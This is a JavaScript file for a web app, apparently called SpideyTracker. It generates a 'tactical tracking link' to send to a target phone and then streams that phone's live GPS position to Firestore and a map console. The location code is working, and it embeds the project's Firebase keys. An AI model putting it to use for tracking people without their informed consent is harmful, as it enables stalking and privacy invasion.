import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// --- CONFIGURACIÓN DE FIREBASE ---
const firebaseConfig = {
    apiKey: "AIzaSyCvJx96Z6LoG9O1UEs-KCNfqjpRrVFjVBQ",
    authDomain: "spideytracker-591bb.firebaseapp.com",
    projectId: "spideytracker-591bb",
    storageBucket: "spideytracker-591bb.firebasestorage.app",
    messagingSenderId: "923704989530",
    appId: "1:923704989530:web:74debc7597acbc80a00563",
    measurementId: "G-RFC57L9T0Y"
};

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let map;
let marker;
const ubicacionPorDefecto = [14.3333, -90.6667]; 

// Detectar si la URL trae un parámetro de objetivo (ej: ?target=objetivo_1)
const urlParams = new URLSearchParams(window.location.search);
const targetId = urlParams.get('target');

document.addEventListener("DOMContentLoaded", function () {
    // Inicializar el mapa
    map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    marker = L.marker(ubicacionPorDefecto).addTo(map)
        .bindPopup("<b>Sistema en línea.</b> Esperando señal...")
        .openPopup();

    setTimeout(() => { map.invalidateSize(); }, 200);

    // ESCENARIO A: Si alguien abrió el enlace en su celular (?target=activo)
    if (targetId) {
        document.getElementById('banner-status').innerHTML = "TRANSMITIENDO SEÑAL<br>GPS ACTIVO...";
        iniciarTransmisionRemota(targetId);
    } else {
        // ESCENARIO B: Estás en tu consola principal; escuchamos la base de datos
        escucharObjetivoRemoto("objetivo_principal");
    }
});

// Botón SHARE LINK: Genera un enlace personalizado para el celular
window.compartirEnlace = function() {
    const baseUrl = window.location.origin + window.location.pathname;
    const enlaceObjetivo = `${baseUrl}?target=objetivo_principal`;
    
    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
        alert("¡Enlace táctico de rastreo copiado!\nEnvíalo al celular objetivo. Al abrirlo y aceptar permisos, su ubicación aparecerá en tu mapa.");
    }).catch(err => {
        console.error("Error al copiar enlace:", err);
    });
};

// Transmitir la ubicación del celular hacia Firebase
function iniciarTransmisionRemota(id) {
    if (!navigator.geolocation) {
        alert("Tu dispositivo no soporta geolocalización.");
        return;
    }

    navigator.geolocation.watchPosition(
        async (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;

            try {
                // Guarda las coordenadas en tiempo real en Firestore
                await setDoc(doc(db, "ratreos", id), {
                    lat: lat,
                    lng: lng,
                    timestamp: new Date()
                });
                console.log("Coordenadas enviadas a la nube:", lat, lng);
            } catch (e) {
                console.error("Error al escribir en la base de datos:", e);
            }
        },
        (error) => {
            alert("Error de GPS: Asegúrate de dar permisos de ubicación.");
        },
        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
    );
}

// Escuchar la ubicación en tu consola principal (PC)
function escucharObjetivoRemoto(id) {
    onSnapshot(doc(db, "ratreos", id), (docSnap) => {
        if (docSnap.exists()) {
            const data = docSnap.data();
            const lat = data.lat;
            const lng = data.lng;

            map.invalidateSize();
            map.setView([lat, lng], 16);
            marker.setLatLng([lat, lng]);
            marker.bindPopup(`<b>¡Objetivo Localizado!</b><br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`).openPopup();
            
            document.getElementById('banner-status').innerHTML = "OBJETIVO ENLAZADO<br>SEÑAL ESTABLE";
        }
    });
}

// Funciones secundarias de los botones
window.obtenerUbicacionActual = function(esInicio = false) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            map.setView([lat, lng], 16);
            marker.setLatLng([lat, lng]).bindPopup("Tu posición local").openPopup();
        });
    }
};

window.accionRastrearObjetivo = () => alert("Protocolo de rastreo activo. Esperando conexión del enlace...");
window.centrarUbicacion = () => map.invalidateSize();
window.cambiarAlerta = (t) => alert("Alerta: " + t);
window.cambiarPerfil = (n) => alert("Perfil: " + n);
window.abrirChat = () => alert("Canal de chat seguro abierto.");
window.verArchivo = () => alert("Abriendo registros históricos...");
